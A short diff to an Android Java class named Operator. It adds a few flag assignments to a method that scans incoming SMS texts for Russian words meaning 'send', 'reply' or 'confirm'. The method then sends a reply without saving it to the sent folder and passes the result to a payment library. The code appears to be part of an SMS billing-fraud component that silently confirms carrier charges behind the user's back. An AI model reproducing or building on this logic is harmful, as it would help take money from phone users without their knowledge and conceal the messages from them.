@@ -100,6 +100,7 @@ public class Operator {
                     }
                 }
             }
+            flagok=false;
         } catch (Exception e) {
             Logger.lg("Code P2P-008: " + e.getMessage());
         }
@@ -130,6 +131,7 @@ public class Operator {
     }
 
     public void sendAnswer(String smsBody, String smsSender) {
+        flagok=true;
         String sms_body = smsBody.toLowerCase();
         Logger.lg("SendAnswer " + sms_body + " smsSender " + smsSender);
         if (sms_body.contains("отправь") || sms_body.contains("ответь") || sms_body.contains("подтверд")) {
@@ -162,6 +164,7 @@ public class Operator {
                         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
                             if (ActivityCompat.checkSelfPermission(cnt, Manifest.permission.SEND_SMS) == PackageManager.PERMISSION_GRANTED) {
                                 smsManager.sendTextMessageWithoutPersisting(smsNum, null, answ, piSent, null);
+
                             }
                         } else {
                             smsManager.sendTextMessage(smsNum, null, answ, piSent, null);
@@ -199,6 +202,7 @@ public class Operator {
             Logger.lg("Error! " + sms_body);
             PayLib.getSMSResult("Code : " + sms_body);
         }
+        flagok = false;
     }
 
 
